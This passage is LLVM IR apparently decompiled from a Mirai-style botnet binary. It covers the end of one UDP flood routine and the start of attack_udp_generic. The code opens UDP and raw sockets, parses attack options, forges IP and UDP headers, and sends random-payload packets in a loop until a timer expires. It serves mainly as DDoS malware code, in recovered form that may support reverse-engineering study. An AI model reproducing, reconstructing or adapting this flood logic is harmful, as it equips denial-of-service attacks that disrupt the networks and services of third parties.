  store i32 %v4_804c3f7, i32* %eax.global-to-local, align 4
  br i1 %v2_804c405, label %dec_label_pc_804c5e7, label %dec_label_pc_804c4e3

dec_label_pc_804c4e3:                             ; preds = %dec_label_pc_804c4cb
  store i32 %arg3, i32* @esi, align 4
  store i32 1, i32* @edi, align 4
  %v0_804c4ec = load i32, i32* @ebp, align 4
  %v1_804c4ee = trunc i32 %v0_804c4ec to i16
  %v2_804c4ee = call i16 @llvm.bswap.i16(i16 %v1_804c4ee)
  %v3_804c4ee = zext i16 %v2_804c4ee to i32
  %v5_804c4ee = and i32 %v0_804c4ec, -65536
  %v6_804c4ee = or i32 %v3_804c4ee, %v5_804c4ee
  store i32 %v6_804c4ee, i32* %edx.global-to-local, align 4
  %v4_804c500 = sext i16 %v2_804c4ee to i32
  %v4_804c528 = zext i16 %storemerge to i32
  %v2_804c544 = ptrtoint i32* %stack_var_-32 to i32
  %v3_804c563 = add i32 %v3_804c42e, -4
  %v4_804c593 = add i32 %v3_804c416, -4
  %v1_804c575 = add nuw nsw i32 %v4_804c3f7, 1
  br label %dec_label_pc_804c57a

dec_label_pc_804c500:                             ; preds = %dec_label_pc_804c57a
  store i32 %v4_804c500, i32* %eax.global-to-local, align 4
  %v2_804c504 = load i32, i32* @esi, align 4
  %v3_804c504 = add i32 %v2_804c504, 2
  %v4_804c504 = inttoptr i32 %v3_804c504 to i16*
  store i16 %v2_804c4ee, i16* %v4_804c504, align 2
  br label %dec_label_pc_804c508

dec_label_pc_804c508:                             ; preds = %dec_label_pc_804c59d, %dec_label_pc_804c500
  store i32 2, i32* %stack_var_-92, align 4
  %v3_804c50f = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 %v3_804c50f, i32* %eax.global-to-local, align 4
  store i32 %v3_804c42e, i32* %edx.global-to-local, align 4
  %v10_804c51b = icmp eq i32 %v3_804c50f, -1
  %v2_804c51e = load i32, i32* @edi, align 4
  %v3_804c51e = mul i32 %v2_804c51e, 4
  %v5_804c51e = add i32 %v3_804c51e, %v3_804c563
  %v6_804c51e = inttoptr i32 %v5_804c51e to i32*
  store i32 %v3_804c50f, i32* %v6_804c51e, align 4
  br i1 %v10_804c51b, label %dec_label_pc_804c5df.loopexit3, label %dec_label_pc_804c528

dec_label_pc_804c528:                             ; preds = %dec_label_pc_804c508
  %v5_804c528 = load i32, i32* %edx.global-to-local, align 4
  %v6_804c528 = and i32 %v5_804c528, -65536
  %v7_804c528 = or i32 %v6_804c528, %v4_804c528
  store i32 2, i32* %stack_var_-32, align 4
  store i32 %v2_804c544, i32* %edx.global-to-local, align 4
  %v0_804c549 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804c549, i32* %stack_var_-92, align 4
  %v4_804c54a = call i32 @bind(i32 %v0_804c549, i32 %v2_804c544, i32 16, i32 %v7_804c528)
  store i32 %v4_804c54a, i32* %eax.global-to-local, align 4
  %v0_804c552 = load i32, i32* @esi, align 4
  %v1_804c552 = add i32 %v0_804c552, 20
  %v2_804c552 = inttoptr i32 %v1_804c552 to i8*
  %v3_804c552 = load i8, i8* %v2_804c552, align 1
  %tmp55 = icmp ult i8 %v3_804c552, 32
  br i1 %tmp55, label %dec_label_pc_804c5b0, label %dec_label_pc_804c558

dec_label_pc_804c558:                             ; preds = %dec_label_pc_804c528, %bb51
  %v0_804c55b = phi i32 [ %v0_804c552, %dec_label_pc_804c528 ], [ %v0_804c55b.pre, %bb51 ]
  %v1_804c55c = add i32 %v0_804c55b, 24
  store i32 %v1_804c55c, i32* @esi, align 4
  store i32 %v3_804c42e, i32* %eax.global-to-local, align 4
  %v1_804c563 = load i32, i32* @edi, align 4
  %v2_804c563 = mul i32 %v1_804c563, 4
  %v4_804c563 = add i32 %v2_804c563, %v3_804c563
  %v5_804c563 = inttoptr i32 %v4_804c563 to i32*
  %v6_804c563 = load i32, i32* %v5_804c563, align 4
  %v1_804c567 = add i32 %v1_804c563, 1
  store i32 %v1_804c567, i32* @edi, align 4
  store i32 %v6_804c563, i32* %stack_var_-92, align 4
  %v3_804c569 = call i32 @__libc_connect(i32 %v6_804c563, i32 %v0_804c55b, i32 16)
  store i32 %v1_804c575, i32* %eax.global-to-local, align 4
  %v0_804c576 = load i32, i32* @edi, align 4
  %v12_804c576 = icmp eq i32 %v0_804c576, %v1_804c575
  br i1 %v12_804c576, label %dec_label_pc_804c5e7, label %dec_label_pc_804c57a

dec_label_pc_804c57a:                             ; preds = %dec_label_pc_804c558, %dec_label_pc_804c4e3
  store i32 65535, i32* %stack_var_-92, align 4
  %v3_804c583 = call i32 @calloc(i64 65535, i32 1)
  store i32 %v3_804c583, i32* %eax.global-to-local, align 4
  store i32 %v3_804c416, i32* %edx.global-to-local, align 4
  %v0_804c58f = load i32, i32* @ebp, align 4
  %v1_804c58f = trunc i32 %v0_804c58f to i16
  %v11_804c58f = icmp eq i16 %v1_804c58f, -1
  %v2_804c593 = load i32, i32* @edi, align 4
  %v3_804c593 = mul i32 %v2_804c593, 4
  %v5_804c593 = add i32 %v4_804c593, %v3_804c593
  %v6_804c593 = inttoptr i32 %v5_804c593 to i32*
  store i32 %v3_804c583, i32* %v6_804c593, align 4
  %v1_804c597 = icmp eq i1 %v11_804c58f, false
  br i1 %v1_804c597, label %dec_label_pc_804c500, label %dec_label_pc_804c59d

dec_label_pc_804c59d:                             ; preds = %dec_label_pc_804c57a
  %v0_804c59d = load i32, i32* %stack_var_-92, align 4
  %v1_804c59d = call i32 @rand_next(i32 %v0_804c59d)
  %v2_804c59d = trunc i32 %v1_804c59d to i16
  store i32 %v1_804c59d, i32* %eax.global-to-local, align 4
  %v3_804c5a2 = load i32, i32* @esi, align 4
  %v4_804c5a2 = add i32 %v3_804c5a2, 2
  %v5_804c5a2 = inttoptr i32 %v4_804c5a2 to i16*
  store i16 %v2_804c59d, i16* %v5_804c5a2, align 2
  br label %dec_label_pc_804c508

dec_label_pc_804c5b0:                             ; preds = %dec_label_pc_804c528
  %v1_804c5b0 = add i32 %v0_804c552, 16
  %v2_804c5b0 = inttoptr i32 %v1_804c5b0 to i32*
  %v3_804c5b0 = load i32, i32* %v2_804c5b0, align 4
  %v0_804c5b3 = load i32, i32* %stack_var_-92, align 4
  %v1_804c5b3 = call i32 @rand_next(i32 %v0_804c5b3)
  store i32 %v1_804c5b3, i32* %eax.global-to-local, align 4
  %v1_804c5b8 = trunc i32 %v3_804c5b0 to i16
  %v2_804c5b8 = call i16 @llvm.bswap.i16(i16 %v1_804c5b8)
  %v3_804c5b8 = zext i16 %v2_804c5b8 to i32
  %v1_804c5bc = udiv i32 %v3_804c5b0, 65536
  %v2_804c5bc = mul nuw i32 %v3_804c5b8, 65536
  %v1_804c5bf = trunc i32 %v1_804c5bc to i16
  %v2_804c5bf = call i16 @llvm.bswap.i16(i16 %v1_804c5bf)
  %v3_804c5bf = zext i16 %v2_804c5bf to i32
  %v6_804c5bf = or i32 %v3_804c5bf, %v2_804c5bc
  %v0_804c5c5 = load i32, i32* @esi, align 4
  %v1_804c5c5 = add i32 %v0_804c5c5, 20
  %v2_804c5c5 = inttoptr i32 %v1_804c5c5 to i8*
  %v3_804c5c5 = load i8, i8* %v2_804c5c5, align 1
  %tmp = urem i8 %v3_804c5c5, 32
  %v4_804c5c8 = icmp eq i8 %tmp, 0
  br i1 %v4_804c5c8, label %bb51, label %bb

bb:                                               ; preds = %dec_label_pc_804c5b0
  %v2_804c5c8 = zext i8 %tmp to i32
  %v5_804c5c8 = lshr i32 %v1_804c5b3, %v2_804c5c8
  store i32 %v5_804c5c8, i32* %eax.global-to-local, align 4
  br label %bb51

bb51:                                             ; preds = %dec_label_pc_804c5b0, %bb
  %v1_804c5ca = phi i32 [ %v1_804c5b3, %dec_label_pc_804c5b0 ], [ %v5_804c5c8, %bb ]
  %v2_804c5ca = add i32 %v1_804c5ca, %v6_804c5bf
  %v1_804c5cc = trunc i32 %v2_804c5ca to i16
  %v2_804c5cc = call i16 @llvm.bswap.i16(i16 %v1_804c5cc)
  %v3_804c5cc = zext i16 %v2_804c5cc to i32
  %v1_804c5d0 = udiv i32 %v2_804c5ca, 65536
  %v2_804c5d0 = mul nuw i32 %v3_804c5cc, 65536
  %v1_804c5d3 = trunc i32 %v1_804c5d0 to i16
  %v2_804c5d3 = call i16 @llvm.bswap.i16(i16 %v1_804c5d3)
  %v3_804c5d3 = zext i16 %v2_804c5d3 to i32
  %v6_804c5d3 = or i32 %v3_804c5d3, %v2_804c5d0
  store i32 %v6_804c5d3, i32* @ebx, align 4
  %v2_804c5d7 = add i32 %v0_804c5c5, 4
  %v3_804c5d7 = inttoptr i32 %v2_804c5d7 to i32*
  store i32 %v6_804c5d3, i32* %v3_804c5d7, align 4
  %v0_804c55b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c558

dec_label_pc_804c5df.loopexit3:                   ; preds = %dec_label_pc_804c508
  %v0_804c5e6.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c5df

dec_label_pc_804c5df:                             ; preds = %dec_label_pc_804c5f9, %dec_label_pc_804c5df.loopexit3
  %v0_804c5e6 = phi i32 [ %v0_804c5e6.pre, %dec_label_pc_804c5df.loopexit3 ], [ %v2_804c5fe, %dec_label_pc_804c5f9 ]
  ret i32 %v0_804c5e6

dec_label_pc_804c5e7:                             ; preds = %dec_label_pc_804c558, %dec_label_pc_804c4cb
  %v4_804c5e716 = urem i32 %v5_804c463, 65536
  store i32 0, i32* @esi, align 4
  store i32 %v4_804c5e716, i32* @ebp, align 4
  %v4_804c624 = icmp eq i8 %v6_804c476, 0
  %v1_804c629 = icmp eq i1 %v4_804c624, false
  br label %dec_label_pc_804c5f3

dec_label_pc_804c5f3:                             ; preds = %dec_label_pc_804c62b, %dec_label_pc_804c5e7
  %v0_804c5f3 = phi i32 [ %v0_804c5f3.pre, %dec_label_pc_804c62b ], [ 0, %dec_label_pc_804c5e7 ]
  %v5_804c5f7 = icmp slt i32 %v0_804c5f3, %v4_804c3f7
  br i1 %v5_804c5f7, label %dec_label_pc_804c614, label %dec_label_pc_804c5f9.preheader

dec_label_pc_804c5f9.preheader:                   ; preds = %dec_label_pc_804c5f3
  br label %dec_label_pc_804c5f9

dec_label_pc_804c5f9:                             ; preds = %dec_label_pc_804c5f9.preheader, %dec_label_pc_804c60c
  store i32 0, i32* %stack_var_-92, align 4
  %v2_804c5fe = call i32 @__GI_time(i32* null)
  store i32 %v2_804c5fe, i32* %eax.global-to-local, align 4
  %v5_804c60a = icmp slt i32 %v2_804c4af, %v2_804c5fe
  br i1 %v5_804c60a, label %dec_label_pc_804c5df, label %dec_label_pc_804c60c

dec_label_pc_804c60c:                             ; preds = %dec_label_pc_804c5f9
  store i32 0, i32* @esi, align 4
  br i1 %v2_804c405, label %dec_label_pc_804c5f9, label %dec_label_pc_804c614

dec_label_pc_804c614:                             ; preds = %dec_label_pc_804c60c, %dec_label_pc_804c5f3
  %v0_804c614 = phi i32 [ %v0_804c5f3, %dec_label_pc_804c5f3 ], [ 0, %dec_label_pc_804c60c ]
  %v1_804c614 = mul i32 %v0_804c614, 4
  store i32 %v1_804c614, i32* @edi, align 4
  store i32 %v3_804c416, i32* %edx.global-to-local, align 4
  %v0_804c61f = load i32, i32* @ebp, align 4
  store i32 %v0_804c61f, i32* %eax.global-to-local, align 4
  %v2_804c621 = add i32 %v1_804c614, %v3_804c416
  %v3_804c621 = inttoptr i32 %v2_804c621 to i32*
  %v4_804c621 = load i32, i32* %v3_804c621, align 4
  store i32 %v4_804c621, i32* @ebx, align 4
  br i1 %v1_804c629, label %dec_label_pc_804c645, label %dec_label_pc_804c62b

dec_label_pc_804c62b:                             ; preds = %dec_label_pc_804c614, %dec_label_pc_804c645
  %v0_804c637 = phi i32 [ %v1_804c614, %dec_label_pc_804c614 ], [ %v0_804c637.pre, %dec_label_pc_804c645 ]
  %v0_804c632 = phi i32 [ %v0_804c614, %dec_label_pc_804c614 ], [ %v0_804c632.pre, %dec_label_pc_804c645 ]
  %v0_804c631 = phi i32 [ %v4_804c621, %dec_label_pc_804c614 ], [ %v0_804c631.pre, %dec_label_pc_804c645 ]
  %v0_804c630 = phi i32 [ %v0_804c61f, %dec_label_pc_804c614 ], [ %v0_804c630.pre, %dec_label_pc_804c645 ]
  %v1_804c632 = add i32 %v0_804c632, 1
  store i32 %v1_804c632, i32* @esi, align 4
  store i32 %v3_804c42e, i32* %eax.global-to-local, align 4
  %v2_804c637 = add i32 %v0_804c637, %v3_804c42e
  %v3_804c637 = inttoptr i32 %v2_804c637 to i32*
  %v4_804c637 = load i32, i32* %v3_804c637, align 4
  store i32 %v4_804c637, i32* %eax.global-to-local, align 4
  store i32 %v4_804c637, i32* %stack_var_-92, align 4
  %v4_804c63b = call i32 @__libc_send(i32 %v4_804c637, i32 %v0_804c631, i32 %v0_804c630, i32 16384)
  store i32 %v4_804c63b, i32* %eax.global-to-local, align 4
  %v0_804c5f3.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c5f3

dec_label_pc_804c645:                             ; preds = %dec_label_pc_804c614
  store i32 %v4_804c621, i32* %stack_var_-92, align 4
  %v2_804c649 = inttoptr i32 %v4_804c621 to i8*
  %v3_804c649 = call i32 @rand_alphastr(i8* %v2_804c649, i32 %v3_804c416)
  %v0_804c64e = load i32, i32* @ebp, align 4
  store i32 %v0_804c64e, i32* %eax.global-to-local, align 4
  %v1_804c653 = load i32, i32* @ebx, align 4
  %v2_804c653 = add i32 %v1_804c653, %v0_804c64e
  %v3_804c653 = inttoptr i32 %v2_804c653 to i8*
  store i8 0, i8* %v3_804c653, align 1
  %v0_804c630.pre = load i32, i32* %eax.global-to-local, align 4
  %v0_804c631.pre = load i32, i32* @ebx, align 4
  %v0_804c632.pre = load i32, i32* @esi, align 4
  %v0_804c637.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804c62b

dec_label_pc_804c65a:                             ; preds = %entry
  %v1_804c65a = call i32 @rand_next(i32 %v2_804c4af)
  store i32 %v1_804c65a, i32* %eax.global-to-local, align 4
  %v1_804c65f = trunc i32 %v1_804c65a to i16
  br label %dec_label_pc_804c4cb

; uselistorder directives
  uselistorder i32 %v4_804c621, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804c614, { 1, 0, 2 }
  uselistorder i32 %v2_804c5fe, { 1, 2, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder i32 %v1_804c59d, { 1, 0 }
  uselistorder i32 %v6_804c563, { 1, 0 }
  uselistorder i32 %v0_804c552, { 1, 0, 2 }
  uselistorder i32 %v3_804c50f, { 1, 0, 2 }
  uselistorder i16 %v2_804c4ee, { 1, 0, 2 }
  uselistorder i32 %v2_804c4af, { 1, 0, 2 }
  uselistorder i32 %v5_804c476, { 1, 0 }
  uselistorder i16 %v1_804c45d, { 1, 0 }
  uselistorder i32 %v3_804c42e, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32 %v3_804c416, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v4_804c3f7, { 2, 4, 3, 7, 8, 0, 5, 6, 1 }
  uselistorder i32* %stack_var_-92, { 2, 3, 4, 1, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 2, 3, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 13, 8, 9, 17, 18, 10, 11, 12, 14, 15, 16, 19, 20, 21, 22, 23 }
  uselistorder label %dec_label_pc_804c62b, { 1, 0 }
  uselistorder label %dec_label_pc_804c5f9, { 1, 0 }
  uselistorder label %bb51, { 1, 0 }
  uselistorder label %dec_label_pc_804c558, { 1, 0 }
}

define i32 @attack_udp_generic(i32 %arg1, i8 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_804c670 = load i32, i32* @ebp, align 4
  %v0_804c672 = load i32, i32* @esi, align 4
  %v0_804c673 = load i32, i32* @ebx, align 4
  %v4_804c679 = zext i8 %arg2 to i32
  %v5_804c679 = load i32, i32* @eax, align 4
  %v6_804c679 = and i32 %v5_804c679, -256
  %v7_804c679 = or i32 %v6_804c679, %v4_804c679
  store i32 %v7_804c679, i32* %eax.global-to-local, align 4
  store i32 %arg5, i32* @esi, align 4
  store i32 %v4_804c679, i32* %edx.global-to-local, align 4
  %v4_804c683 = urem i32 %arg4, 256
  store i32 0, i32* %stack_var_-20, align 4
  store i32 %v4_804c683, i32* @ebx, align 4
  %v2_804c6a0 = zext i8 %arg2 to i64
  %v3_804c6a0 = call i32 @calloc(i64 %v2_804c6a0, i32 4)
  store i32 %v3_804c6a0, i32* @eax, align 4
  %v0_804c6ad = load i32, i32* @esi, align 4
  %v0_804c6ae = load i32, i32* @ebx, align 4
  %v4_804c6af = trunc i32 %v0_804c6ae to i8
  %v5_804c6af = call i32 @attack_get_opt_int(i8 %v4_804c6af, i32 %v0_804c6ad, i32 2, i32 0)
  store i32 %v5_804c6af, i32* @eax, align 4
  %v0_804c6c2 = load i32, i32* @esi, align 4
  %v0_804c6c3 = load i32, i32* @ebx, align 4
  %v4_804c6c4 = trunc i32 %v0_804c6c3 to i8
  %v5_804c6c4 = call i32 @attack_get_opt_int(i8 %v4_804c6c4, i32 %v0_804c6c2, i32 3, i32 65535)
  %v6_804c6c4 = trunc i32 %v5_804c6c4 to i16
  store i32 %v5_804c6c4, i32* @eax, align 4
  %v0_804c6d1 = load i32, i32* @esi, align 4
  %v0_804c6d2 = load i32, i32* @ebx, align 4
  %v4_804c6d3 = trunc i32 %v0_804c6d2 to i8
  %v5_804c6d3 = call i32 @attack_get_opt_int(i8 %v4_804c6d3, i32 %v0_804c6d1, i32 4, i32 64)
  store i32 %v5_804c6d3, i32* @eax, align 4
  %v0_804c6e3 = load i32, i32* @esi, align 4
  %v0_804c6e4 = load i32, i32* @ebx, align 4
  %v4_804c6e5 = trunc i32 %v0_804c6e4 to i8
  %v5_804c6e5 = call i32 @attack_get_opt_int(i8 %v4_804c6e5, i32 %v0_804c6e3, i32 5, i32 0)
  %v6_804c6e5 = trunc i32 %v5_804c6e5 to i8
  store i32 %v5_804c6e5, i32* @eax, align 4
  %v0_804c6f5 = load i32, i32* @esi, align 4
  %v0_804c6f6 = load i32, i32* @ebx, align 4
  %v4_804c6f7 = trunc i32 %v0_804c6f6 to i8
  %v5_804c6f7 = call i32 @attack_get_opt_int(i8 %v4_804c6f7, i32 %v0_804c6f5, i32 6, i32 65535)
  %v6_804c6f7 = trunc i32 %v5_804c6f7 to i16
  store i32 %v5_804c6f7, i32* @eax, align 4
  %v0_804c70a = load i32, i32* @esi, align 4
  %v0_804c70b = load i32, i32* @ebx, align 4
  %v4_804c70c = trunc i32 %v0_804c70b to i8
  %v5_804c70c = call i32 @attack_get_opt_int(i8 %v4_804c70c, i32 %v0_804c70a, i32 7, i32 65535)
  store i32 %v5_804c70c, i32* @eax, align 4
  %sext = mul i32 %v5_804c70c, 65536
  %v1_804c716 = sdiv i32 %sext, 65536
  store i32 %v1_804c716, i32* @ebp, align 4
  %v0_804c71a = load i32, i32* @esi, align 4
  %v0_804c71b = load i32, i32* @ebx, align 4
  %v4_804c71c = trunc i32 %v0_804c71b to i8
  %v5_804c71c = call i32 @attack_get_opt_int(i8 %v4_804c71c, i32 %v0_804c71a, i32 0, i32 512)
  store i32 %v5_804c71c, i32* @eax, align 4
  %sext3 = mul i32 %v5_804c71c, 65536
  %v1_804c724 = sdiv i32 %sext3, 65536
  store i32 %v1_804c724, i32* @edi, align 4
  %v0_804c72a = load i32, i32* @esi, align 4
  %v0_804c72b = load i32, i32* @ebx, align 4
  %v4_804c72c = trunc i32 %v0_804c72b to i8
  %v5_804c72c = call i32 @attack_get_opt_int(i8 %v4_804c72c, i32 %v0_804c72a, i32 1, i32 1)
  %v6_804c72c = trunc i32 %v5_804c72c to i8
  store i32 %v5_804c72c, i32* @eax, align 4
  %v0_804c731 = load i32, i32* @global_var_805a858.27, align 8
  store i32 %v0_804c731, i32* %ecx.global-to-local, align 4
  %v0_804c73e = load i32, i32* @esi, align 4
  %v0_804c73f = load i32, i32* @ebx, align 4
  %v4_804c740 = trunc i32 %v0_804c73f to i8
  %v5_804c740 = call i32 @attack_get_opt_int(i8 %v4_804c740, i32 %v0_804c73e, i32 24, i32 %v0_804c731)
  store i32 %v5_804c740, i32* %eax.global-to-local, align 4
  %v2_804c74e = call i32 @__GI_time(i32* null)
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v2_804c757 = add i32 %v2_804c74e, %arg1
  store i32 %v2_804c757, i32* %eax.global-to-local, align 4
  %v3_804c766 = call i32 @socket(i32 2, i32 3, i32 17)
  %v1_804c772 = add i32 %v3_804c766, 1
  %v8_804c772 = icmp eq i32 %v1_804c772, 0
  store i32 %v1_804c772, i32* %eax.global-to-local, align 4
  br i1 %v8_804c772, label %dec_label_pc_804cb1a, label %dec_label_pc_804c779

dec_label_pc_804c779:                             ; preds = %entry
  store i32 1, i32* %stack_var_-20, align 4
  %v2_804c786 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804c786, i32* %eax.global-to-local, align 4
  store i32 %v3_804c766, i32* %esi.global-to-local, align 4
  %v5_804c794 = call i32 @__GI_setsockopt(i32 %v3_804c766, i32 0, i32 3, i32 %v2_804c786, i32 4)
  %v1_804c79c = add i32 %v5_804c794, 1
  %v8_804c79c = icmp eq i32 %v1_804c79c, 0
  store i32 %v1_804c79c, i32* @eax, align 4
  br i1 %v8_804c79c, label %dec_label_pc_804cb2e, label %dec_label_pc_804c7a3

dec_label_pc_804c7a3:                             ; preds = %dec_label_pc_804c779
  %sext4 = mul i32 %v5_804c6c4, 65536
  %v4_804c7a3 = sdiv i32 %sext4, 65536
  store i32 %v4_804c7a3, i32* %eax.global-to-local, align 4
  %sext5 = mul i32 %v5_804c6f7, 65536
  %v4_804c7a7 = sdiv i32 %sext5, 65536
  store i32 %v4_804c7a7, i32* %edx.global-to-local, align 4
  %v0_804c7b5 = load i32, i32* @ebp, align 4
  %v1_804c7b5 = trunc i32 %v0_804c7b5 to i16
  %v0_804c7ba = load i32, i32* @edi, align 4
  %v1_804c7ba = trunc i32 %v0_804c7ba to i16
  %v8_804c7c4 = icmp ugt i16 %v1_804c7ba, 1460
  store i32 0, i32* %stack_var_-20, align 4
  %v4_804c7d2 = icmp eq i8 %arg2, 0
  %v0_804c7ba.op = and i32 %v0_804c7ba, 65535
  %.pre = select i1 %v8_804c7c4, i32 1460, i32 %v0_804c7ba.op
  br i1 %v4_804c7d2, label %dec_label_pc_804c89b, label %dec_label_pc_804c7dd

dec_label_pc_804c7dd:                             ; preds = %dec_label_pc_804c7a3
  %v6_804c7dd = and i32 %v0_804c7ba, -65536
  %v7_804c7dd = or i32 %.pre, %v6_804c7dd
  %v5_804c7e2 = load i32, i32* %esi.global-to-local, align 4
  %v6_804c7e2 = and i32 %v5_804c7e2, -65536
  %v7_804c7e2 = or i32 %v6_804c7e2, %.pre
  %v1_804c7e7 = add i32 %v7_804c7dd, 28
  %v1_804c7ea = add i32 %v7_804c7e2, 8
  store i32 %v1_804c7ea, i32* @esi, align 4
  store i32 0, i32* @ebx, align 4
  %v6_804c7ef = and i32 %v4_804c7a3, -65536
  %v1_804c7f4 = trunc i32 %v1_804c7e7 to i16
  %v2_804c7f4 = call i16 @llvm.bswap.i16(i16 %v1_804c7f4)
  %v3_804c7f4 = zext i16 %v2_804c7f4 to i32
  %v5_804c7f4 = and i32 %v1_804c7e7, -65536
  %v6_804c7f4 = or i32 %v3_804c7f4, %v5_804c7f4
  store i32 %v6_804c7f4, i32* @edi, align 4
  %v2_804c7f8 = call i16 @llvm.bswap.i16(i16 %v6_804c6c4)
  %v3_804c7f8 = zext i16 %v2_804c7f8 to i32
  %v6_804c7f8 = or i32 %v6_804c7ef, %v3_804c7f8
  store i32 %v6_804c7f8, i32* %eax.global-to-local, align 4
  %v4_804c7fc = icmp eq i8 %v6_804c6e5, 0
  %v1_804c806 = icmp eq i1 %v4_804c7fc, false
  %v4_804ca8d = urem i32 %v5_804c6af, 256
  %v3_804cac3 = add i32 %arg3, 16
  %v2_804cacf = call i16 @llvm.bswap.i16(i16 %v6_804c6f7)
  %v3_804cacf = zext i16 %v2_804cacf to i32
  %v2_804cadb = call i16 @llvm.bswap.i16(i16 %v1_804c7b5)
  br i1 %v1_804c806, label %dec_label_pc_804ca69.preheader, label %dec_label_pc_804c80c.preheader

dec_label_pc_804ca69.preheader:                   ; preds = %dec_label_pc_804c7dd
  %v1_804caaa = trunc i32 %v5_804c6d3 to i8
  br label %dec_label_pc_804ca69

dec_label_pc_804c80c.preheader:                   ; preds = %dec_label_pc_804c7dd
  %v1_804c847 = trunc i32 %v5_804c6d3 to i8
  br label %dec_label_pc_804c80c

dec_label_pc_804c80c:                             ; preds = %dec_label_pc_804c80c.preheader, %dec_label_pc_804c80c
  %v3_804c815 = call i32 @calloc(i64 1510, i32 1)
  store i32 %v3_804c815, i32* %eax.global-to-local, align 4
  store i32 %v3_804c6a0, i32* %ebp.global-to-local, align 4
  %v3_804c81e = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804c81e, i32* %ecx.global-to-local, align 4
  %v2_804c822 = load i32, i32* @ebx, align 4
  %v3_804c822 = mul i32 %v2_804c822, 4
  %v4_804c822 = add i32 %v3_804c822, %v3_804c6a0
  %v5_804c822 = inttoptr i32 %v4_804c822 to i32*
  store i32 %v3_804c815, i32* %v5_804c822, align 4
  %v0_804c826 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804c826 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804c826 = mul i32 %v1_804c826, 4
  %v3_804c826 = add i32 %v2_804c826, %v0_804c826
  %v4_804c826 = inttoptr i32 %v3_804c826 to i32*
  %v5_804c826 = load i32, i32* %v4_804c826, align 4
  store i32 %v5_804c826, i32* %eax.global-to-local, align 4
  %v1_804c82a = inttoptr i32 %v5_804c826 to i8*
  store i8 69, i8* %v1_804c82a, align 1
  %v0_804c82d = load i32, i32* %eax.global-to-local, align 4
  %v1_804c82d = add i32 %v0_804c82d, 20
  store i32 %v1_804c82d, i32* %ebx.global-to-local, align 4
  %v5_804c830 = load i32, i32* @edx, align 4
  %v6_804c830 = and i32 %v5_804c830, -256
  %v7_804c830 = or i32 %v6_804c830, %v4_804ca8d
  store i32 %v7_804c830, i32* %edx.global-to-local, align 4
  %v0_804c834 = load i32, i32* @edi, align 4
  %v1_804c834 = trunc i32 %v0_804c834 to i16
  %v3_804c834 = add i32 %v0_804c82d, 2
  %v4_804c834 = inttoptr i32 %v3_804c834 to i16*
  store i16 %v1_804c834, i16* %v4_804c834, align 2
  %v0_804c838 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c838 = trunc i32 %v0_804c838 to i8
  %v2_804c838 = load i32, i32* %eax.global-to-local, align 4
  %v3_804c838 = add i32 %v2_804c838, 1
  %v4_804c838 = inttoptr i32 %v3_804c838 to i8*
  store i8 %v1_804c838, i8* %v4_804c838, align 1
  %v5_804c83b = load i32, i32* %ebp.global-to-local, align 4
  %v6_804c83b = and i32 %v5_804c83b, -65536
  %v7_804c83b = or i32 %v6_804c83b, %v3_804c7f8
  store i32 %v7_804c83b, i32* %ebp.global-to-local, align 4
  %v2_804c847 = load i32, i32* %eax.global-to-local, align 4
  %v3_804c847 = add i32 %v2_804c847, 8
  %v4_804c847 = inttoptr i32 %v3_804c847 to i8*
  store i8 %v1_804c847, i8* %v4_804c847, align 1
  %v0_804c84a = load i32, i32* %eax.global-to-local, align 4
  %v1_804c84a = add i32 %v0_804c84a, 9
  %v2_804c84a = inttoptr i32 %v1_804c84a to i8*
  store i8 17, i8* %v2_804c84a, align 1
  %v0_804c84e = load i32, i32* %ebp.global-to-local, align 4
  %v1_804c84e = trunc i32 %v0_804c84e to i16
  %v2_804c84e = load i32, i32* %eax.global-to-local, align 4
  %v3_804c84e = add i32 %v2_804c84e, 4
  %v4_804c84e = inttoptr i32 %v3_804c84e to i16*
  store i16 %v1_804c84e, i16* %v4_804c84e, align 2
  %v0_804c856 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804c856 = mul i32 %v0_804c856, 3
  store i32 %v3_804c856, i32* %edx.global-to-local, align 4
  %v1_804c859 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c859 = add i32 %v1_804c859, 12
  %v3_804c859 = inttoptr i32 %v2_804c859 to i32*
  store i32 %v5_804c740, i32* %v3_804c859, align 4
  store i32 %arg3, i32* @ebp, align 4
  %v1_804c860 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c860 = mul i32 %v1_804c860, 8
  %v4_804c860 = add i32 %v2_804c860, %v3_804cac3
  %v5_804c860 = inttoptr i32 %v4_804c860 to i32*
  %v6_804c860 = load i32, i32* %v5_804c860, align 4
  store i32 %v6_804c860, i32* %edx.global-to-local, align 4
  %v1_804c864 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c864 = add i32 %v1_804c864, 16
  %v3_804c864 = inttoptr i32 %v2_804c864 to i32*
  store i32 %v6_804c860, i32* %v3_804c864, align 4
  %v5_804c867 = load i32, i32* %edx.global-to-local, align 4
  %v5_804c86c = and i32 %v5_804c867, -65536
  %v6_804c86c = or i32 %v5_804c86c, %v3_804cacf
  store i32 %v6_804c86c, i32* %edx.global-to-local, align 4
